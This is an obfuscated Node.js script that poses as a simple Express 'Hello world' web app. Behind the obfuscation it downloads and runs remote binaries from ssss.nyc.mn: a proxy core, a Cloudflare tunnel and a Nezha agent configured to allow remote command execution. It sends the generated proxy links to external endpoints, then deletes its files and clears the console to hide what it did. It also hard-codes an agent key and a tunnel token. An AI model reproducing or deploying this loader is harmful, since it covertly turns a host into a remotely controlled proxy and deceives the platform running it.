const _0x17f438=_0x4c98;(function(_0x24d177,_0x5346cf){const _0x5e2c61=_0x4c98,_0x5482b8=_0x24d177();while(!![]){try{const _0x35aba4=-parseInt(_0x5e2c61(0x188))/0x1*(-parseInt(_0x5e2c61(0x1bb))/0x2)+-parseInt(_0x5e2c61(0x20e))/0x3+-parseInt(_0x5e2c61(0x1c6))/0x4*(-parseInt(_0x5e2c61(0x1a2))/0x5)+parseInt(_0x5e2c61(0x194))/0x6*(-parseInt(_0x5e2c61(0x225))/0x7)+parseInt(_0x5e2c61(0x1dc))/0x8*(parseInt(_0x5e2c61(0x176))/0x9)+parseInt(_0x5e2c61(0x173))/0xa+-parseInt(_0x5e2c61(0x20f))/0xb*(parseInt(_0x5e2c61(0x202))/0xc);if(_0x35aba4===_0x5346cf)break;else _0x5482b8['push'](_0x5482b8['shift']());}catch(_0x2ffe8e){_0x5482b8['push'](_0x5482b8['shift']());}}}(_0x3d21,0x8eb21));const express=require('express'),app=express(),axios=require(_0x17f438(0x228)),os=require('os'),fs=require('fs'),path=require(_0x17f438(0x1bd)),{promisify}=require('util'),exec=promisify(require(_0x17f438(0x203))[_0x17f438(0x1c5)]),{execSync}=require(_0x17f438(0x203)),UPLOAD_URL=process['env'][_0x17f438(0x21b)]||'',PROJECT_URL=process['env'][_0x17f438(0x1a4)]||'',AUTO_ACCESS=process[_0x17f438(0x1aa)][_0x17f438(0x1cb)]||![],FILE_PATH=process[_0x17f438(0x1aa)][_0x17f438(0x22d)]||'/tmp/vls',SUB_PATH=process['env']['SUB_PATH']||_0x17f438(0x22a),PORT=process[_0x17f438(0x1aa)][_0x17f438(0x22b)]||process[_0x17f438(0x1aa)]['PORT']||0x1eb4,UUID=process['env'][_0x17f438(0x1b2)]||_0x17f438(0x1ef),NEZHA_SERVER=process[_0x17f438(0x1aa)][_0x17f438(0x1df)]||_0x17f438(0x1d4),NEZHA_PORT=process[_0x17f438(0x1aa)][_0x17f438(0x1fb)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl',ARGO_DOMAIN=process[_0x17f438(0x1aa)][_0x17f438(0x1b7)]||'huggf.faiz.us.kg',ARGO_AUTH=process[_0x17f438(0x1aa)][_0x17f438(0x1a3)]||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYmQ5MzM0ZTEtZmI3OS00ODg4LTlhYjItYjEwYzczYTM4YzM3IiwicyI6Ik1qbGpaVEl6WlRndE5UVmtZUzAwTXpCbUxUazBZamN0TjJWaVpUVTNNalpqWlRVeCJ9',ARGO_PORT=process[_0x17f438(0x1aa)]['ARGO_PORT']||0x1f41,CFIP=process[_0x17f438(0x1aa)][_0x17f438(0x1b5)]||_0x17f438(0x1e0),CFPORT=process[_0x17f438(0x1aa)][_0x17f438(0x1c4)]||0x1bb,NAME=process['env']['NAME']||_0x17f438(0x1fa);!fs[_0x17f438(0x224)](FILE_PATH)?(fs[_0x17f438(0x1e8)](FILE_PATH,{'recursive':!![]}),console[_0x17f438(0x20d)](FILE_PATH+_0x17f438(0x179))):console[_0x17f438(0x20d)](FILE_PATH+_0x17f438(0x18d));let npmPath=path[_0x17f438(0x192)](FILE_PATH,'npm'),phpPath=path['join'](FILE_PATH,_0x17f438(0x21f)),webPath=path['join'](FILE_PATH,_0x17f438(0x181)),botPath=path[_0x17f438(0x192)](FILE_PATH,'bot'),subPath=path[_0x17f438(0x192)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x17f438(0x1ce)),bootLogPath=path[_0x17f438(0x192)](FILE_PATH,_0x17f438(0x212)),configPath=path[_0x17f438(0x192)](FILE_PATH,_0x17f438(0x1ac));function deleteNodes(){const _0x38b3e9=_0x17f438;try{if(!UPLOAD_URL)return;if(!fs[_0x38b3e9(0x224)](subPath))return;let _0x4f2a01;try{_0x4f2a01=fs[_0x38b3e9(0x172)](subPath,_0x38b3e9(0x19f));}catch{return null;}const _0x443032=Buffer['from'](_0x4f2a01,_0x38b3e9(0x17f))[_0x38b3e9(0x193)]('utf-8'),_0x1ec501=_0x443032['split']('\x0a')[_0x38b3e9(0x1d3)](_0x2152d7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38b3e9(0x1a7)](_0x2152d7));if(_0x1ec501[_0x38b3e9(0x213)]===0x0)return;return axios['post'](UPLOAD_URL+_0x38b3e9(0x1d9),JSON[_0x38b3e9(0x1eb)]({'nodes':_0x1ec501}),{'headers':{'Content-Type':_0x38b3e9(0x19b)}})[_0x38b3e9(0x227)](_0x2672c7=>{return null;});}catch(_0x28d718){return null;}}function cleanupOldFiles(){const _0x55ca1b=_0x17f438,_0x4e6d4d=[_0x55ca1b(0x181),_0x55ca1b(0x1cd),_0x55ca1b(0x17d),'php',_0x55ca1b(0x190),_0x55ca1b(0x212)];_0x4e6d4d[_0x55ca1b(0x1d7)](_0x2da332=>{const _0x56351a=_0x55ca1b,_0x311296=path['join'](FILE_PATH,_0x2da332);fs[_0x56351a(0x1b6)](_0x311296,()=>{});});}app['get']('/',function(_0x307fc1,_0x389aac){const _0xef5b81=_0x17f438;_0x389aac[_0xef5b81(0x201)]('Hello\x20world!');});const config={'log':{'access':_0x17f438(0x1b3),'error':'/dev/null','loglevel':_0x17f438(0x1e4)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x17f438(0x1af)}],'decryption':_0x17f438(0x1e4),'fallbacks':[{'dest':0xbb9},{'path':_0x17f438(0x183),'dest':0xbba},{'path':_0x17f438(0x1f4),'dest':0xbbb},{'path':_0x17f438(0x195),'dest':0xbbc}]},'streamSettings':{'network':_0x17f438(0x219)}},{'port':0xbb9,'listen':_0x17f438(0x1f1),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x17f438(0x219),'security':_0x17f438(0x1e4)}},{'port':0xbba,'listen':_0x17f438(0x1f1),'protocol':_0x17f438(0x1a9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x17f438(0x1e4)},'streamSettings':{'network':'ws','security':_0x17f438(0x1e4),'wsSettings':{'path':_0x17f438(0x183)}},'sniffing':{'enabled':!![],'destOverride':[_0x17f438(0x1f9),_0x17f438(0x229),_0x17f438(0x18f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x17f438(0x1f1),'protocol':_0x17f438(0x1d5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x17f438(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x17f438(0x1f9),_0x17f438(0x229),_0x17f438(0x18f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x17f438(0x1f1),'protocol':_0x17f438(0x17a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x17f438(0x1e4),'wsSettings':{'path':_0x17f438(0x195)}},'sniffing':{'enabled':!![],'destOverride':[_0x17f438(0x1f9),_0x17f438(0x229),_0x17f438(0x18f)],'metadataOnly':![]}}],'dns':{'servers':[_0x17f438(0x19a)]},'outbounds':[{'protocol':_0x17f438(0x1ad),'tag':'direct'},{'protocol':_0x17f438(0x1da),'tag':_0x17f438(0x1f3)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x17f438(0x1ac)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x308aa8=_0x17f438,_0x343ec7=os[_0x308aa8(0x21a)]();return _0x343ec7===_0x308aa8(0x175)||_0x343ec7==='arm64'||_0x343ec7===_0x308aa8(0x1c7)?_0x308aa8(0x175):_0x308aa8(0x22e);}function downloadFile(_0x498e76,_0x3d4358,_0xf7ba90){const _0x3bbd11=_0x17f438,_0x5cb43f=path[_0x3bbd11(0x192)](FILE_PATH,_0x498e76),_0x337eff=fs[_0x3bbd11(0x22f)](_0x5cb43f);axios({'method':_0x3bbd11(0x184),'url':_0x3d4358,'responseType':_0x3bbd11(0x174)})[_0x3bbd11(0x1b0)](_0xcb43d=>{const _0x17f45b=_0x3bbd11;_0xcb43d[_0x17f45b(0x1e7)][_0x17f45b(0x1d1)](_0x337eff),_0x337eff['on']('finish',()=>{const _0x125a9d=_0x17f45b;_0x337eff[_0x125a9d(0x20a)](),console[_0x125a9d(0x20d)](_0x125a9d(0x199)+_0x498e76+_0x125a9d(0x19c)),_0xf7ba90(null,_0x498e76);}),_0x337eff['on']('error',_0x2dc309=>{const _0x2669eb=_0x17f45b;fs[_0x2669eb(0x1b6)](_0x5cb43f,()=>{});const _0x527e70=_0x2669eb(0x199)+_0x498e76+_0x2669eb(0x185)+_0x2dc309[_0x2669eb(0x1e9)];console['error'](_0x527e70),_0xf7ba90(_0x527e70);});})['catch'](_0x1d2387=>{const _0x38e916=_0x3bbd11,_0x339c48=_0x38e916(0x199)+_0x498e76+_0x38e916(0x185)+_0x1d2387[_0x38e916(0x1e9)];console[_0x38e916(0x210)](_0x339c48),_0xf7ba90(_0x339c48);});}async function downloadFilesAndRun(){const _0x5d1a6c=_0x17f438,_0x1654d3=getSystemArchitecture(),_0x3bd3f9=getFilesForArchitecture(_0x1654d3);if(_0x3bd3f9[_0x5d1a6c(0x213)]===0x0){console[_0x5d1a6c(0x20d)](_0x5d1a6c(0x1e6));return;}const _0x19e322=_0x3bd3f9[_0x5d1a6c(0x207)](_0x2c01a3=>{return new Promise((_0x2781df,_0x5b2119)=>{const _0x5406df=_0x4c98;downloadFile(_0x2c01a3[_0x5406df(0x1ed)],_0x2c01a3[_0x5406df(0x20b)],(_0x196d1f,_0x19208f)=>{_0x196d1f?_0x5b2119(_0x196d1f):_0x2781df(_0x19208f);});});});try{await Promise[_0x5d1a6c(0x222)](_0x19e322);}catch(_0x1235b7){console[_0x5d1a6c(0x210)](_0x5d1a6c(0x180),_0x1235b7);return;}function _0x42313d(_0x348f58){const _0xd4a968=_0x5d1a6c,_0x5b7bb3=0x1fd;_0x348f58[_0xd4a968(0x1d7)](_0x327de9=>{const _0x4abbad=_0xd4a968,_0x17ae67=path[_0x4abbad(0x192)](FILE_PATH,_0x327de9);fs[_0x4abbad(0x224)](_0x17ae67)&&fs[_0x4abbad(0x200)](_0x17ae67,_0x5b7bb3,_0xb79828=>{const _0x13bfd9=_0x4abbad;_0xb79828?console['error'](_0x13bfd9(0x1d2)+_0x17ae67+':\x20'+_0xb79828):console['log'](_0x13bfd9(0x211)+_0x17ae67+':\x20'+_0x5b7bb3['toString'](0x8));});});}const _0x298a84=NEZHA_PORT?[_0x5d1a6c(0x208),_0x5d1a6c(0x205),_0x5d1a6c(0x1f6)]:[_0x5d1a6c(0x1ee),_0x5d1a6c(0x205),_0x5d1a6c(0x1f6)];_0x42313d(_0x298a84);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x335b32=NEZHA_SERVER[_0x5d1a6c(0x1f2)](':')?NEZHA_SERVER[_0x5d1a6c(0x19d)](':')[_0x5d1a6c(0x1a8)]():'',_0x36a86a=new Set([_0x5d1a6c(0x1ff),_0x5d1a6c(0x1bc),_0x5d1a6c(0x216),_0x5d1a6c(0x1a0),'2083','2053']),_0x46e36e=_0x36a86a['has'](_0x335b32)?_0x5d1a6c(0x1dd):_0x5d1a6c(0x1f8),_0x3477bd=_0x5d1a6c(0x1e2)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x5d1a6c(0x1a6)+_0x46e36e+_0x5d1a6c(0x21d)+UUID;fs[_0x5d1a6c(0x1e3)](path['join'](FILE_PATH,_0x5d1a6c(0x1ab)),_0x3477bd);const _0xfd9306=_0x5d1a6c(0x206)+FILE_PATH+_0x5d1a6c(0x1cc)+FILE_PATH+_0x5d1a6c(0x214);try{await exec(_0xfd9306),console[_0x5d1a6c(0x20d)](_0x5d1a6c(0x182)),await new Promise(_0x3c25cf=>setTimeout(_0x3c25cf,0x3e8));}catch(_0x5757a4){console[_0x5d1a6c(0x210)](_0x5d1a6c(0x1fd)+_0x5757a4);}}else{let _0x5927b5='';const _0x7252e8=['443',_0x5d1a6c(0x1bc),'2096',_0x5d1a6c(0x1a0),_0x5d1a6c(0x226),_0x5d1a6c(0x21e)];_0x7252e8[_0x5d1a6c(0x1f2)](NEZHA_PORT)&&(_0x5927b5='--tls');const _0x1f51d4=_0x5d1a6c(0x206)+FILE_PATH+_0x5d1a6c(0x1d0)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5927b5+_0x5d1a6c(0x1ba);try{await exec(_0x1f51d4),console['log']('npm\x20is\x20running'),await new Promise(_0x41539a=>setTimeout(_0x41539a,0x3e8));}catch(_0x54d1bf){console[_0x5d1a6c(0x210)](_0x5d1a6c(0x1c9)+_0x54d1bf);}}}else console['log'](_0x5d1a6c(0x1d8));const _0x34fd92=_0x5d1a6c(0x206)+FILE_PATH+_0x5d1a6c(0x1ea)+FILE_PATH+_0x5d1a6c(0x223);try{await exec(_0x34fd92),console['log']('web\x20is\x20running'),await new Promise(_0x1d8b0c=>setTimeout(_0x1d8b0c,0x3e8));}catch(_0x5582cd){console['error'](_0x5d1a6c(0x209)+_0x5582cd);}if(fs['existsSync'](path[_0x5d1a6c(0x192)](FILE_PATH,_0x5d1a6c(0x1cd)))){let _0x227cdb;if(ARGO_AUTH[_0x5d1a6c(0x18a)](/^[A-Z0-9a-z=]{120,250}$/))_0x227cdb=_0x5d1a6c(0x1fc)+ARGO_AUTH;else ARGO_AUTH[_0x5d1a6c(0x18a)](/TunnelSecret/)?_0x227cdb='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5d1a6c(0x1c3):_0x227cdb=_0x5d1a6c(0x1fe)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5d1a6c(0x206)+FILE_PATH+_0x5d1a6c(0x1b9)+_0x227cdb+'\x20>/dev/null\x202>&1\x20&'),console[_0x5d1a6c(0x20d)](_0x5d1a6c(0x197)),await new Promise(_0x276675=>setTimeout(_0x276675,0x7d0));}catch(_0x172646){console[_0x5d1a6c(0x210)](_0x5d1a6c(0x217)+_0x172646);}}await new Promise(_0x3cb855=>setTimeout(_0x3cb855,0x1388));}function getFilesForArchitecture(_0x9372ad){const _0x2cbb27=_0x17f438;let _0x353ad7;_0x9372ad==='arm'?_0x353ad7=[{'fileName':_0x2cbb27(0x181),'fileUrl':_0x2cbb27(0x189)},{'fileName':_0x2cbb27(0x1cd),'fileUrl':_0x2cbb27(0x1c8)}]:_0x353ad7=[{'fileName':_0x2cbb27(0x181),'fileUrl':_0x2cbb27(0x18c)},{'fileName':_0x2cbb27(0x1cd),'fileUrl':_0x2cbb27(0x221)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2d8a06=_0x9372ad===_0x2cbb27(0x175)?_0x2cbb27(0x1ae):_0x2cbb27(0x1e1);_0x353ad7[_0x2cbb27(0x1c2)]({'fileName':_0x2cbb27(0x17d),'fileUrl':_0x2d8a06});}else{const _0x5ec820=_0x9372ad===_0x2cbb27(0x175)?'https://arm64.ssss.nyc.mn/v1':_0x2cbb27(0x17e);_0x353ad7[_0x2cbb27(0x1c2)]({'fileName':_0x2cbb27(0x21f),'fileUrl':_0x5ec820});}}return _0x353ad7;}function argoType(){const _0xbb8895=_0x17f438;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xbb8895(0x20d)](_0xbb8895(0x186));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,_0xbb8895(0x19e)),ARGO_AUTH);const _0x5922fa=_0xbb8895(0x1b8)+ARGO_AUTH['split']('\x22')[0xb]+_0xbb8895(0x18e)+path[_0xbb8895(0x192)](FILE_PATH,_0xbb8895(0x19e))+_0xbb8895(0x18b)+ARGO_DOMAIN+_0xbb8895(0x1c1)+ARGO_PORT+_0xbb8895(0x1f0);fs[_0xbb8895(0x1e3)](path[_0xbb8895(0x192)](FILE_PATH,'tunnel.yml'),_0x5922fa);}else console[_0xbb8895(0x20d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x1d752a=_0x17f438;let _0x310554;if(ARGO_AUTH&&ARGO_DOMAIN)_0x310554=ARGO_DOMAIN,console[_0x1d752a(0x20d)](_0x1d752a(0x1b4),_0x310554),await _0xe36d50(_0x310554);else try{const _0xe5e36b=fs[_0x1d752a(0x172)](path[_0x1d752a(0x192)](FILE_PATH,_0x1d752a(0x212)),_0x1d752a(0x19f)),_0x450c7e=_0xe5e36b[_0x1d752a(0x19d)]('\x0a'),_0x2181b1=[];_0x450c7e[_0x1d752a(0x1d7)](_0x26332b=>{const _0x118e17=_0x1d752a,_0xf5bb37=_0x26332b[_0x118e17(0x18a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xf5bb37){const _0x2e5417=_0xf5bb37[0x1];_0x2181b1[_0x118e17(0x1cf)](_0x2e5417);}});if(_0x2181b1[_0x1d752a(0x213)]>0x0)_0x310554=_0x2181b1[0x0],console[_0x1d752a(0x20d)](_0x1d752a(0x218),_0x310554),await _0xe36d50(_0x310554);else{console[_0x1d752a(0x20d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1d752a(0x220)](path[_0x1d752a(0x192)](FILE_PATH,_0x1d752a(0x212)));async function _0x5e8408(){const _0x2d47ae=_0x1d752a;try{await exec(_0x2d47ae(0x198));}catch(_0x18fe24){}}_0x5e8408(),await new Promise(_0xcb95af=>setTimeout(_0xcb95af,0xbb8));const _0x583e05='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1d752a(0x196)+ARGO_PORT;try{await exec('nohup\x20'+path[_0x1d752a(0x192)](FILE_PATH,_0x1d752a(0x1cd))+'\x20'+_0x583e05+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0x1d752a(0x1a1)),await new Promise(_0x1567a9=>setTimeout(_0x1567a9,0xbb8)),await extractDomains();}catch(_0x33ac08){console[_0x1d752a(0x210)](_0x1d752a(0x217)+_0x33ac08);}}}catch(_0x3e95d3){console[_0x1d752a(0x210)]('Error\x20reading\x20boot.log:',_0x3e95d3);}async function _0xe36d50(_0x4ae7ea){const _0xeede6c=_0x1d752a,_0x42b761=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0xeede6c(0x19f)}),_0x144435=_0x42b761[_0xeede6c(0x1e5)]();return new Promise(_0x14c5f3=>{setTimeout(()=>{const _0x4fe4bf=_0x4c98,_0x4fd066={'v':'2','ps':NAME+'-'+_0x144435,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4fe4bf(0x1e4),'net':'ws','type':_0x4fe4bf(0x1e4),'host':_0x4ae7ea,'path':_0x4fe4bf(0x20c),'tls':'tls','sni':_0x4ae7ea,'alpn':''},_0x2944ef='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4fe4bf(0x1f7)+_0x4ae7ea+_0x4fe4bf(0x1de)+_0x4ae7ea+_0x4fe4bf(0x1db)+NAME+'-'+_0x144435+_0x4fe4bf(0x1be)+Buffer[_0x4fe4bf(0x215)](JSON[_0x4fe4bf(0x1eb)](_0x4fd066))[_0x4fe4bf(0x193)]('base64')+_0x4fe4bf(0x22c)+UUID+'@'+CFIP+':'+CFPORT+_0x4fe4bf(0x21c)+_0x4ae7ea+'&type=ws&host='+_0x4ae7ea+_0x4fe4bf(0x1bf)+NAME+'-'+_0x144435+_0x4fe4bf(0x1a5);console[_0x4fe4bf(0x20d)](Buffer[_0x4fe4bf(0x215)](_0x2944ef)[_0x4fe4bf(0x193)]('base64')),fs[_0x4fe4bf(0x1e3)](subPath,Buffer['from'](_0x2944ef)[_0x4fe4bf(0x193)](_0x4fe4bf(0x17f))),console['log'](FILE_PATH+_0x4fe4bf(0x177)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x3aaef9,_0x473156)=>{const _0x26225b=_0x4fe4bf,_0x59d201=Buffer[_0x26225b(0x215)](_0x2944ef)[_0x26225b(0x193)](_0x26225b(0x17f));_0x473156['set'](_0x26225b(0x187),_0x26225b(0x204)),_0x473156[_0x26225b(0x201)](_0x59d201);}),_0x14c5f3(_0x2944ef);},0x7d0);});}}async function uplodNodes(){const _0x2bfcd9=_0x17f438;if(UPLOAD_URL&&PROJECT_URL){const _0x12e339=PROJECT_URL+'/'+SUB_PATH,_0x2cbac7={'subscription':[_0x12e339]};try{const _0x4be507=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x2cbac7,{'headers':{'Content-Type':'application/json'}});if(_0x4be507[_0x2bfcd9(0x1c0)]===0xc8)console[_0x2bfcd9(0x20d)](_0x2bfcd9(0x1f5));else return null;}catch(_0x5c7be5){if(_0x5c7be5[_0x2bfcd9(0x1ec)]){if(_0x5c7be5[_0x2bfcd9(0x1ec)][_0x2bfcd9(0x1c0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2bfcd9(0x224)](listPath))return;const _0x4f264e=fs[_0x2bfcd9(0x172)](listPath,_0x2bfcd9(0x19f)),_0x3a87c0=_0x4f264e['split']('\x0a')[_0x2bfcd9(0x1d3)](_0x203ddb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2bfcd9(0x1a7)](_0x203ddb));if(_0x3a87c0[_0x2bfcd9(0x213)]===0x0)return;const _0x3cd8f8=JSON[_0x2bfcd9(0x1eb)]({'nodes':_0x3a87c0});try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x3cd8f8,{'headers':{'Content-Type':'application/json'}});if(response[_0x2bfcd9(0x1c0)]===0xc8)console['log'](_0x2bfcd9(0x1f5));else return null;}catch(_0x110347){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xf44bd8=_0x4c98,_0x50dc35=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x50dc35[_0xf44bd8(0x1cf)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x50dc35[_0xf44bd8(0x1cf)](phpPath);exec(_0xf44bd8(0x178)+_0x50dc35[_0xf44bd8(0x192)]('\x20')+_0xf44bd8(0x1ca),_0x2c0787=>{const _0x4cb026=_0xf44bd8;console[_0x4cb026(0x17c)](),console['log']('App\x20is\x20running'),console[_0x4cb026(0x20d)](_0x4cb026(0x1b1));});},0x15f90);}function _0x3d21(){const _0x4ad48a=['NEZHA_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','php\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','443','chmod','send','109680LzqaQD','child_process','text/plain;\x20charset=utf-8','./web','nohup\x20','map','./npm','web\x20running\x20error:\x20','close','fileUrl','/vmess-argo?ed=2560','log','2977767IEOtBI','11vvrHqT','error','Empowerment\x20success\x20for\x20','boot.log','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','from','2096','Error\x20executing\x20command:\x20','ArgoDomain:','tcp','arch','UPLOAD_URL','?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2053','php','unlinkSync','https://amd64.ssss.nyc.mn/2go','all','/config.json\x20>/dev/null\x202>&1\x20&','existsSync','292313doMOSW','2083','catch','axios','tls','sub','SERVER_PORT','\x0a\x20\x20\x0atrojan://','FILE_PATH','amd','createWriteStream','listen','readFileSync','6863020OroNJZ','stream','arm','23877nBxWeX','/sub.txt\x20saved\x20successfully','rm\x20-rf\x20','\x20is\x20created','trojan','添加URL失败:\x20','clear','npm','https://amd64.ssss.nyc.mn/v1','base64','Error\x20downloading\x20files:','web','php\x20is\x20running','/vless-argo','get','\x20failed:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Content-Type','283331hwopha','https://arm64.ssss.nyc.mn/web','match','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/web','\x20already\x20exists','\x0a\x20\x20credentials-file:\x20','quic','sub.txt','automatic\x20access\x20task\x20added\x20successfully','join','toString','150NUThwY','/trojan-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','bot\x20is\x20running','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','Download\x20','https+local://8.8.8.8/dns-query','application/json','\x20successfully','split','tunnel.json','utf-8','2087','bot\x20is\x20running.','709395JZVaQv','ARGO_AUTH','PROJECT_URL','\x0a\x20\x20\x20\x20','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','test','pop','vless','env','config.yaml','config.json','freedom','https://arm64.ssss.nyc.mn/agent','xtls-rprx-vision','then','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','UUID','/dev/null','ARGO_DOMAIN:','CFIP','unlink','ARGO_DOMAIN','\x0a\x20\x20tunnel:\x20','/bot\x20','\x20>/dev/null\x202>&1\x20&','2nAQvFA','8443','path','\x0a\x20\x20\x0avmess://','&path=%2Ftrojan-argo%3Fed%3D2560#','status','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','unshift','/tunnel.yml\x20run','CFPORT','exec','16rXZlKL','aarch64','https://arm64.ssss.nyc.mn/2go','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1','AUTO_ACCESS','/php\x20-c\x20\x22','bot','list.txt','push','/npm\x20-s\x20','pipe','Empowerment\x20failed\x20for\x20','filter','nzag.faiz.us.kg:8008','vmess','post','forEach','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/delete-nodes','blackhole','&path=%2Fvless-argo%3Fed%3D2560#','3296veROaO','true','&type=ws&host=','NEZHA_SERVER','www.visa.com.sg','https://amd64.ssss.nyc.mn/agent','\x0aclient_secret:\x20','writeFileSync','none','trim','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','data','mkdirSync','message','/web\x20-c\x20','stringify','response','fileName','./php','4b60b788-00bd-41dd-b241-17c4eba4056d','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','127.0.0.1','includes','block','/vmess-argo','Subscription\x20uploaded\x20successfully','./bot','?encryption=none&security=tls&sni=','false','http','Vls'];_0x3d21=function(){return _0x4ad48a;};return _0x3d21();}cleanFiles();async function AddVisitTask(){const _0x3261ae=_0x17f438;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3261ae(0x20d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x47d705=await axios[_0x3261ae(0x1d6)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3261ae(0x19b)}});console['log'](_0x3261ae(0x191));}catch(_0x2f21b3){console['error'](_0x3261ae(0x17b)+_0x2f21b3[_0x3261ae(0x1e9)]);}}function _0x4c98(_0x4f6cd3,_0x422bf7){const _0x3d216e=_0x3d21();return _0x4c98=function(_0x4c989d,_0x29c877){_0x4c989d=_0x4c989d-0x171;let _0xcc94b5=_0x3d216e[_0x4c989d];return _0xcc94b5;},_0x4c98(_0x4f6cd3,_0x422bf7);}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x17f438(0x171)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
